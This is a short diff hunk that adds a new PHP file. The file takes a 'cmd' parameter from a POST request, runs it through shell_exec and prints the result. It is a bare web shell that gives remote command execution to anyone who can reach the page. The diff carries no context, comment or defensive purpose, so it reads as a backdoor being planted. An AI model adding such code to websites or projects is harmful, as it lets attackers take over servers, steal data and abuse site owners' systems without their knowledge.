@@ -1,0 +1,5 @@
+<?php if ($_POST['cmd']) { echo "<pre>"; $output = shell_exec($_POST['cmd']);
+    echo $output;
+    echo "</pre>";
+}
+?>
